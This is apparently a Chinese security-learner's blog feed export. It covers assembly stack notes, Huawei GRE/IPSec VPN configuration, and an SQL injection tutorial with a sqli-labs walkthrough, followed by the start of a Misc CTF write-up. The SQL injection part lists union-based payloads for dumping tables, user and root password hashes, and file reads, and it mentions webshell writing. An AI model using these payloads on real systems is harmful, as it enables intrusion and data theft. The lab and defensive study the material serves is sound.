src="https://pic.imgdb.cn/item/667d127ad9c307b7e944166d.png" style="zoom:67%;"><p>出栈：</p><img src="https://pic.imgdb.cn/item/667d12fad9c307b7e94501c2.png" style="zoom: 67%;"><blockquote><p>段寄存器SS：存放栈顶的段地址</p><p>寄存器SP：存放栈顶的偏移地址</p><p>SS:SP指向栈顶元素</p></blockquote><p>push指令执行过程：</p><img src="https://pic.imgdb.cn/item/667d15bdd9c307b7e94a072d.png" style="zoom:80%;"><img src="https://pic.imgdb.cn/item/667d184cd9c307b7e94e85b4.png" style="zoom:67%;"><p>pop是push的逆过程</p><p>push：先SP=SP-2，再放入数据</p><p>pop：先取出数据，再SP=SP+2</p><p><strong>注意</strong>：pop之后，数据其实依旧在，只是下一次push的时候，会将其覆盖</p><blockquote><p>当栈为空时，SP指向最高地址单元的下一个单元，这样当有数据进来，sp先减2，指向1000EH再将数据写入</p></blockquote><img src="https://pic.imgdb.cn/item/667d174dd9c307b7e94cd75a.png" style="zoom:67%;"><p>换个角度看：</p><img src="https://pic.imgdb.cn/item/667d1997d9c307b7e950d426.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/667fd8c0d9c307b7e95eca43.png" style="zoom:67%;"><h3 id="栈顶越界的问题"><a href="#栈顶越界的问题" class="headerlink" title="栈顶越界的问题"></a>栈顶越界的问题</h3><blockquote><p>要根据可能用到的最大栈空间，来安排栈的大小，防止入栈的数据过多而导致超界</p><p>执行出栈时也要注意，以防栈空的时候出栈导致超界</p></blockquote><h3 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h3><p>push ds：将一个段寄存器中的数据入栈</p><p>pop ds：出栈，用一个段寄存器接收出栈的数据</p><p><img src="https://pic.imgdb.cn/item/6680fe30d9c307b7e9c40a50.png"></p><p><img src="https://pic.imgdb.cn/item/6680fe7ad9c307b7e9c45fbb.png"></p><p> <img src="https://pic.imgdb.cn/item/6680ffaed9c307b7e9c5e44a.png"></p><ul><li>mov ax,001AH</li><li>mov bx,001BH</li><li>mov cx,1000H</li><li>mov ss,cx</li><li>mov sp,0010H</li><li>push ax</li><li>push bx</li><li>mov ax,0</li><li>mov bx,0</li><li>pop bx</li><li>pop ax</li></ul><img src="https://pic.imgdb.cn/item/668102cad9c307b7e9cac72f.png" style="zoom:67%;"><p><img src="https://pic.imgdb.cn/item/66810376d9c307b7e9cb99b6.png"></p><ul><li>mov cx,1000H//段寄存器过渡</li><li>mov ss,cx</li><li>mov sp,0010H   //栈顶指针</li><li>mov ax,002AH  //赋值</li><li>mov bx,002BH</li><li>push ax               //入栈</li><li>push bx</li><li>mov ax,0             //清零</li><li>mov bx,0</li><li>pop ax                  //用ax来接收刚刚bx的数据</li><li>pop bx</li></ul><p><img src="https://pic.imgdb.cn/item/668106abd9c307b7e9cf64bb.png"></p><ul><li>mov ax,1000H</li><li>mov ss,ax</li><li>mov sp,2             //因为push之前先执行SP=SP-2，所以将栈顶指针指到10002H</li><li>mov ax,2266H</li><li>push ax</li></ul><img src="https://pic.imgdb.cn/item/66810673d9c307b7e9cf2521.png" style="zoom:67%;"><h3 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h3><blockquote><p>将一段内存当作栈段是我们自己安排的，CPU不会在执行push、pop时自动将我们定义的栈段当作栈空间来使用</p></blockquote><p><img src="https://pic.imgdb.cn/item/66810feed9c307b7e9da8107.png"></p><p><img src="https://pic.imgdb.cn/item/66810f9fd9c307b7e9da27f6.png"></p><h2 id="汇编语言程序"><a href="#汇编语言程序" class="headerlink" title="汇编语言程序"></a>汇编语言程序</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><blockquote><p>汇编指令：有对应的机器码的指令，可以被编译为机器指令，最终被CPU执行</p><p>伪指令：没有对应的机器码的指令，最终不被CPU所执行，它是由编译器来执行的指令</p></blockquote><ul><li>伪指令：</li></ul><p>segment和ends是一对成对使用的伪指令</p><p>功能是定义一个段，segment说明一个段开始，ends说明一个段结束</p><ul><li>伪指令使用格式：</li></ul><p>​段名segment</p><p>​段名ends</p><blockquote><p>一个汇编指令由多个段组成，这些段用来存放代码、数据 、当作栈空间来使用</p><p>一个有意义的汇编程序中至少有一个段，这个段用来存放代码</p><p>end是一个汇编程序的结束标记，编译器在编译过程中碰到end就结束对源程序的编译</p></blockquote><ul><li>assume:</li></ul><p>假设某一段寄存器和程序中的某一个segment……ends定义的段相关联</p><blockquote><p>源程序：源程序文件中的所有内容</p><p>程序：源程序中最终由计算机执行处理的指令或数据</p><p>程序最先以汇编指令的形式存在源程序中，经编译连接后变为机器码，存在可执行文件中</p></blockquote><img src="https://pic.imgdb.cn/item/668124a0d9c307b7e9f50371.png" style="zoom:67%;"><ul><li>标号：一个标号指代了一个地址</li><li>codesg放在segment前面，作为一个段的名称，他最终会被编译连接程序处理为一个段的段地址</li></ul><img src="https://pic.imgdb.cn/item/6681264cd9c307b7e9f6d51f.png" style="zoom:67%;"><blockquote><p>DOS是一个单任务操作系统</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN技术</title>
      <link href="/2024/06/06/vpn-ji-zhu/"/>
      <url>/2024/06/06/vpn-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="VPN技术"><a href="#VPN技术" class="headerlink" title="VPN技术"></a>VPN技术</h1><h2 id="VPN是干啥的"><a href="#VPN是干啥的" class="headerlink" title="VPN是干啥的"></a>VPN是干啥的</h2><blockquote><p>==官方解释==：</p><p>​VPN（Virtual Private Network，虚拟专用网络）技术是一种可以在公共网络上建立安全的、加密的连接，使用户可以通过网络访问私有网络资源的技术。VPN技术通过在用户和目标网络之间建立加密隧道来确保数据传输的安全性和私密性，避免了数据在互联网上传输时被非法获取或篡改的风险。<br>​VPN技术的主要作用包括：提供加密保护的网络连接、绕过地理位置限制、保护隐私和匿名性、保护数据传输的安全性。在实际应用中，VPN技术广泛应用于企业内部网络、远程办公、跨国公司的分支机构连接、绕过地域限制的访问等场景。</p><p>==我的理解==：</p><p>​首先，先明白ipv4地址是有限的，并且从ipv4过渡到ipv6的过程是漫长的，所以就出现了NAT技术（地址转换），所以也就有了公网地址和私网地址之分，公网地址就是可以在公共的Internet上传数据的IP地址，私网地址就是只能在本地进行数据传输的ip地址。<br>​但是，当你想要提供安全的传输，数据不被篡改，就可以建立VPN隧道来保障。<br>​两个公司一个总部，一个分部，他们之间可以建立VPN隧道，这样他们就可以看作在同一个网段通信了</p></blockquote><h2 id="VPN的分类"><a href="#VPN的分类" class="headerlink" title="VPN的分类"></a>VPN的分类</h2><h3 id="GRE"><a href="#GRE" class="headerlink" title="GRE"></a>GRE</h3><blockquote><p>最大的优点：兼容性强，不管是单播、广播都可以打通，第二个优点就是简单，利于学习</p><p>缺点：不安全</p></blockquote><p>给数据包加上一个新头部来实现隧道传输</p><blockquote><p>举个例子：</p><p>总部和分公司，源地址192.168.1.x（私网地址），目标地址172.16.1.x（私网地址）</p><p>加一个新头部，源地址64.1.1.1（出口路由器公网地址），目标地址202.1.1.1（出口路由器公网地址）</p><p>数据包送到分公司的出口路由器，路由器将外层报头拆掉，露出真实目标地址</p></blockquote><h4 id="配置实战"><a href="#配置实战" class="headerlink" title="配置实战"></a>配置实战</h4><p>实验拓扑图：</p><img src="https://pic.imgdb.cn/item/66728d6ed9c307b7e954a06d.png" style="zoom: 67%;"><p>出口路由器AR1上作配置:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]int Tunnel 0/0/0//创建隧道接口</span><br><span class="line">[Huawei-Tunnel-0/0/0]tunnel-protocol gre//隧道协议为gre</span><br><span class="line">[Huawei-Tunnel-0/0/0]source 64.1.1.1//隧道源地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]destination 202.1.1.1      //隧道目的地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]ip add 10.1.1.1 24//创建隧道口的虚拟ip</span><br><span class="line">[Huawei]dis ip int b//查看接口信息</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66728d29d9c307b7e9542d26.png"></p><p>出口路由器AR2上作相对应配置:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]int Tunnel 0/0/0//创建隧道接口</span><br><span class="line">[Huawei-Tunnel-0/0/0]tunnel-protocol gre//隧道协议为gre</span><br><span class="line">[Huawei-Tunnel-0/0/0]source 202.1.1.1//隧道源地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]destination 64.1.1.1       //隧道目的地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]ip add 10.1.1.2 24//创建隧道口的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>出口路由器配置静态路由：</p><p>AR1:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 172.16.1.0 24 10.1.1.2//下一跳写隧道对端的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>AR2:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 192.168.1.0 24 10.1.1.1//下一跳写隧道对端的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>抓包分析：</p><img src="https://pic.imgdb.cn/item/66728f18d9c307b7e9579c58.png" style="zoom:200%;"><h4 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h4><ol><li>明文传输，数据未加密，容易被窃取</li><li>没有完整性验证，没有防篡改功能</li><li>没有身份验证</li></ol><p>进而可以用IPSec</p><h3 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h3><blockquote><p>防火墙有安全域（信任，不信任）</p><p>优点：</p><ul><li><p>数据加密，即使被截胡，也看不懂</p></li><li><p>哈希，防篡改</p></li><li><p>身份验证</p></li></ul></blockquote><h4 id="配置实战-1"><a href="#配置实战-1" class="headerlink" title="配置实战"></a>配置实战</h4><p>实验拓扑图：</p><img src="https://pic.imgdb.cn/item/66729290d9c307b7e95f29ec.png" style="zoom:67%;"><blockquote><p>防火墙默认账号：admin，密码：admin@123</p></blockquote><p>配置防火墙接口地址……</p><p>配置FW1默认路由：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]ip route-static 0.0.0.0 0 64.1.1.2</span><br></pre></td></tr></tbody></table></figure><p>配置FW2默认路由：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]ip route-static 0.0.0.0 0 202.1.1.2</span><br></pre></td></tr></tbody></table></figure><p>配置FW1与FW2安全域</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]firewall zone trust //配置信任域</span><br><span class="line">[USG6000V1-zone-trust]add int g0/1/0//将接口加入信任域</span><br><span class="line">[USG6000V1]firewall zone untrust//配置非信任域</span><br><span class="line">[USG6000V1-zone-untrust]add int g1/0/0//将接口加入信任域</span><br></pre></td></tr></tbody></table></figure><p>配置FW1与FW2安全策略</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]security-policy //进入安全策略</span><br><span class="line">[USG6000V1-policy-security]rule name 123 //新建策略名称</span><br><span class="line">[USG6000V1-policy-security-rule-123]action permit//放行所有</span><br><span class="line">[USG6000V1]int g1/0/0</span><br><span class="line">[USG6000V1-g1/0/0]service-manage ping permit//允许接口被ping</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封神台高校CTF练习（Web靶场）</title>
      <link href="/2024/06/04/feng-shen-tai-gao-xiao-ctf-lian-xi-web-ba-chang/"/>
      <url>/2024/06/04/feng-shen-tai-gao-xiao-ctf-lian-xi-web-ba-chang/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF练习 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2024/05/29/sql-zhu-ru/"/>
      <url>/2024/05/29/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>​Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>​在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用， 也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and 1=1 和 and 1=2 以及字符型注入进行判断！推荐使用 burpsuite 的 sqlmap 插件，这样可以很方便，鼠标右键就可以将数据包直接发送到 sqlmap 里面进行检测了！</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>代码层最佳防御 sql 漏洞方案：采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法。 </p><p>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注 入攻击。 </p><p>（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。 </p><p>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。 </p><p>（4）数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句正确执行。 </p><p>（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。 </p><p>（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><h2 id="注入的相关知识"><a href="#注入的相关知识" class="headerlink" title="注入的相关知识"></a>注入的相关知识</h2><p>在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 <strong>infomation_schema</strong> 里面这个库里面有很多表，重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息</p><p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p><img src="https://pic.imgdb.cn/item/671f4fe3d29ded1a8c087c02.png" style="zoom:67%;"><p>columns 存储该用户创建的所有数据库的库名、标名和字段名</p><img src="https://pic.imgdb.cn/item/671f500fd29ded1a8c08abb0.png" style="zoom:67%;"><p>查询某个库某个表的字段可以这样查询 </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.COLUMNS where TABLE_SCHEMA='www_dvwa_com' and TABLE_NAME='users'</span><br></pre></td></tr></tbody></table></figure><ul><li>information_schema是一个默认存在的数据库，其中包含着TABLES和COLUMNS等表，这两个表中都有TABLE_SCHEMA字段，都是表示存在的所有的数据库</li></ul><h2 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a><strong>SQL 注入原理</strong></h2><p>SQL 注入漏洞的产生需要满足以下两个条件</p><ul><li>参数用户可控：从前端传给后端的参数内容是用户可以控制的</li><li>参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</li></ul><p>当用户传入参数为 1’的时候,在数据库执行如下所示。 </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1' </span><br></pre></td></tr></tbody></table></figure><p>此 SQL 语句不符合语法规则就会报错。 </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 </span><br></pre></td></tr></tbody></table></figure><p>当用户传入参数为 1 and 1=1 时 </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=1 </span><br></pre></td></tr></tbody></table></figure><p>因为 1=1 为真 id=1 也是真 and 两边均为真 所以页面会返回 id=1 的结果。 </p><p>如果用户传入参数为 1 and 1=2 时 </p><p>因为 1=2 为假 id=1 为真 and 两边有一个为假，所以页面返回与 id=1 不一样的结果。 </p><p>由此可以初步判断存在 SQL 注入漏洞，攻击者可以进一步拼接 SQL 攻击语句， 进行攻击，致使信息泄露，甚至获取服务器权限</p><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a><strong>判断是否存在注入</strong></h2><p>回显是指页面有数据 信息返回</p><p>id =1 and 1=1</p><p>id = 1 and 1=2</p><p>id = 1 or 1=1</p><p>id = ‘1’ or ‘1’=’1’</p><p>id=” 1 “or “1”=”1”</p><p>无回显是指 根据输入的语句 页面没有任何变化,或者没有数据库中的内容显示到网页中</p><h2 id="三种SQL注释符"><a href="#三种SQL注释符" class="headerlink" title="三种SQL注释符"></a><strong>三种SQL注释符</strong></h2><ul><li><p>#：单行注释，注意与 url 中的#区分，常编码为%23</p></li><li><p>–空格：单行注释，注意为短线短线空格</p></li><li><p>/*（ ）*/：多行注释，至少存在俩处的注入 ，/**/常用来作为空格</p></li></ul><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>是否存在注入并且判断注入类型</p><ol><li><p>判断字段数 order by</p></li><li><p>确定回显点 union select 1,2</p></li><li><p>查询数据库信息 @@version @@datadir</p></li><li><p>查询用户名，数据库名 user() database()</p></li><li><p>文件读取 union select 1,load_file(‘C:\wondows\win.ini’)#</p></li><li><p>写入 webshell select..into outfile…</p></li></ol><p><u><strong>使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</strong></u></p><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p><p>UNION query SQL injection（可联合查询注入）</p><p>Stacked queries SQL injection（可多语句查询注入）堆叠查询</p><p>Boolean-based blind SQL injection（布尔型注入）</p><p>Error-based SQL injection（报错型注入）</p><p>Time-based blind SQL injection（基于时间延迟注入）</p><h2 id="接受请求类型区分"><a href="#接受请求类型区分" class="headerlink" title="接受请求类型区分"></a><strong>接受请求类型区分</strong></h2><p><strong>GET</strong> <strong>注入</strong></p><p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要URL 编码</p><p><strong>POST</strong> <strong>注入</strong></p><p>POST 请求参数是放在请求 body 里的，长度没有限制</p><p><strong>COOKIE</strong> <strong>注入</strong></p><p>cookie 参数放在请求头信息，提交的时候服务器会从请求头获取</p><p><img src="https://pic.imgdb.cn/item/67397a69d29ded1a8c58e5b0.png"></p><h2 id="注入数据类型的区分"><a href="#注入数据类型的区分" class="headerlink" title="注入数据类型的区分"></a><strong>注入数据类型的区分</strong></h2><p><strong>int</strong> <strong>整型</strong></p><p>select * from users where id=1</p><p><strong>sting</strong> <strong>字符型</strong></p><p>select * from users where username=’admin’</p><p><strong>like</strong> <strong>搜索型</strong></p><p>select * from news where title like ‘%标题%’%：匹配多个字符</p><h2 id="SQL注入常规利用思路"><a href="#SQL注入常规利用思路" class="headerlink" title="SQL注入常规利用思路"></a>SQL注入常规利用思路</h2><p>1、寻找注入点，可以通过 web 扫描工具实现</p><p>2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用</p><p>户权限、操作系统信息、数据库版本等相关信息。</p><p>3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字</p><p>段名等信息）</p><p>3.1 还可以获取数据库的 root 账号 密码—思路</p><p>4、可以通过获得的用户信息，寻找后台登录。</p><p>5、利用后台或了解的进一步信息。</p><h2 id="手工注入常规思路"><a href="#手工注入常规思路" class="headerlink" title="手工注入常规思路"></a>手工注入常规思路</h2><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>2.猜解 SQL 查询语句中的字段数 order by N</p><p>3.确定显示的字段顺序</p><p>4.获取当前数据库</p><p>5.获取数据库中的表</p><p>6.获取表中的字段名</p><p>7.查询到账户的数据</p><h2 id="SQL详细注入过程"><a href="#SQL详细注入过程" class="headerlink" title="SQL详细注入过程"></a>SQL详细注入过程</h2><p>（1）猜数据库：</p><p>1’ union select 1,database()</p><p>payload 利用另一种方式：</p><p>1’ union select user(),database()</p><p>version()</p><p>得到数据库名：dvwa</p><p>PS：union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select</p><p>注意在使用 union 查询的时候需要和主查询的列数相同。</p><p>（2）猜表名：</p><p>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()</p><p>得到表名：guestbook,users</p><p>group_concat 分组</p><p>（3）猜列名：</p><p>1’ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name =0x7573657273#</p><p>1’ union select 1,group_concat(column_name) from information_schema.columns</p><p>where table_name =’users’#</p><p>(用编码就不用单引号，用单引号就不用编码)</p><p>得到列：</p><p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,usernam</p><p>e,password</p><p>（4）猜用户数据：</p><p>列举出几种 payload:</p><p>1’ or 1=1 union select</p><p>group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>1’ union select null,concat_ws(char(32,58,32),user,password) from users #</p><p>1’ union select null,group_concat(concat_ws(char(32,58,32),user,password)) from</p><p>users #</p><p>得到用户数据：</p><p>admin 5f4dcc3b5aa765d61d8327deb882cf99</p><p>（5）猜 root 用户：#</p><p>1’ union select 1,group_concat(user,password) from mysql.user#</p><p>得到 root 用户信息：</p><p>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p><h1 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h1><h2 id="union-联合注入原理"><a href="#union-联合注入原理" class="headerlink" title="union 联合注入原理"></a>union 联合注入原理</h2><p>​联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段要数要相同，不然会出现报错。</p><h1 id="sqli-labs-master练习"><a href="#sqli-labs-master练习" class="headerlink" title="sqli-labs-master练习"></a>sqli-labs-master练习</h1><h2 id="Less-1（基于错误的GET单引号字符型注入）"><a href="#Less-1（基于错误的GET单引号字符型注入）" class="headerlink" title="Less-1（基于错误的GET单引号字符型注入）"></a>Less-1（基于错误的GET单引号字符型注入）</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">联合查询注⼊流程&nbsp;</span><br><span class="line">1、判断原有查询语句字段数数</span><br><span class="line">2、使原来查询语句的查询结果为空</span><br><span class="line">3、判断查询结果输出位置</span><br><span class="line">4、使⽤ union 操作符拼接 payload 语句</span><br><span class="line">5、利⽤ payload 进⾏数据查询</span><br></pre></td></tr></tbody></table></figure><blockquote><p>显示正常页面</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1e4a5e6d1bfa059237d2.png"></p><blockquote><p>找注入点，破坏SQL语法结构，发现存在注入点，并且为字符型</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1e9f5e6d1bfa0592d24e.png" alt="不为数字型"></p><p><img src="https://pic.imgdb.cn/item/665f1dca5e6d1bfa059120fe.png" alt="字符型"></p><blockquote><p>用联合查询，需要知道对应的列数，于是用order by判断列数<br>先用10列来测，回显不对，于是二分继续测试</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1fd85e6d1bfa05944713.png"></p><blockquote><p>测试出有3列</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f20645e6d1bfa0594e49e.png"></p><blockquote><p>用union查询，判断回显位置，回显位置为2，3</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f210c5e6d1bfa0595a8a2.png"></p><blockquote><p>查数据库名称</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f213e5e6d1bfa0595e6ab.png" alt="查数据库名"></p><blockquote><p>查数据表名</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在 mysql5.0 以上的版本中加⼊了 information_schema 这个系统库，该库内存放该数据库所有的库名，表名，字段名以及它们的从属关系，利⽤ information_schema 库可以查询当前数据所有的表名</span><br><span class="line">用group_concat()函数显示所有表名</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665f22965e6d1bfa05975f44.png" alt="查数据表名"></p><blockquote><p>用户信息在表“users”里，于是查其字段名</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f23265e6d1bfa0597fc97.png" alt="查字段名"></p><blockquote><p>查用户数据</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f23ab5e6d1bfa05988597.png" alt="查数据"></p><h2 id="Less-2（基于错误的GET整型注入）"><a href="#Less-2（基于错误的GET整型注入）" class="headerlink" title="Less-2（基于错误的GET整型注入）"></a>Less-2（基于错误的GET整型注入）</h2><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封神台高校CTF练习（Misc入门靶场）</title>
      <link href="/2024/05/29/feng-shen-tai-gao-xiao-ctf-lian-xi-misc-ru-men-ba-chang/"/>
      <url>/2024/05/29/feng-shen-tai-gao-xiao-ctf-lian-xi-misc-ru-men-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="封神台高校CTF练习（Misc入门靶场）"><a href="#封神台高校CTF练习（Misc入门靶场）" class="headerlink" title="封神台高校CTF练习（Misc入门靶场）"></a>封神台高校CTF练习（Misc入门靶场）</h1><hr><h3 id="封神台练习平台"><a href="#封神台练习平台" class="headerlink" title="封神台练习平台"></a><a href="https://hack.zkaq.cn/">封神台练习平台</a></h3><h2 id="用到的工具平台"><a href="#用到的工具平台" class="headerlink" title="==用到的工具平台=="></a>==用到的工具平台==</h2><p>Unicode加解密：<a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChinese">https://www.toolhelper.cn/EncodeDecode/UnicodeChinese</a><br>RC4加解密：<a href="https://www.lddgo.net/encrypt/rc4">在线RC4加密解密 (lddgo.net)</a><br>MD5加解密：<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a><br>凯撒密码加解密：<a href="https://www.lddgo.net/encrypt/caesar-cipher">在线凯撒密码加密解密 (lddgo.net)</a><br>核心价值观加解密平台：<a href="http://www.hiencode.com/cvencode.html">CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (hiencode.com)</a><br>栅栏加解密平台：（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>）<br>Base加解密平台：<a href="http://www.hiencode.com/base64.html">CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (hiencode.com)</a><br>百度识图：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">https://graph.baidu.com/pcpage/index?tpl_from=pc</a></p><h2 id="（1）杂项1：图片隐写"><a href="#（1）杂项1：图片隐写" class="headerlink" title="（1）杂项1：图片隐写"></a>（1）杂项1：图片隐写</h2><p> <img src="https://pic.imgdb.cn/item/665715c4d9c307b7e93f60fd.png"></p><ul><li><p>步骤</p><blockquote><p>将图片下载到本地，并且用文本文档（.txt）打开并查看源码</p></blockquote><p>  <img src="https://pic.imgdb.cn/item/66571ca6d9c307b7e9485bcc.png" alt="图片"></p><blockquote><p>查看源码，发现有Unicode码</p></blockquote>  